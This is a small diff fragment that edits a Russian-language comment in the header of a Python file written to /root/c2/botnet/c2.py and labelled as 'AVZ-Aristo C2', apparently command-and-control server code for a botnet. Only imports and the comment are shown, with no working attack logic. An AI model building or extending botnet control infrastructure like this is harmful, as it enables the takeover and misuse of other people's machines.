@@ -1,6 +1,6 @@
 cat > /root/c2/botnet/c2.py << 'EOF'
 #!/usr/bin/env python3
-# AVZ-Aristo C2 v25.15.1 – исправленная автоустановка
+# AVZ-Aristo C2 v25.15.1 – работает, не падает
 import asyncio, json, os, time, subprocess, sys, requests
 from datetime import datetime
 from aiohttp import web
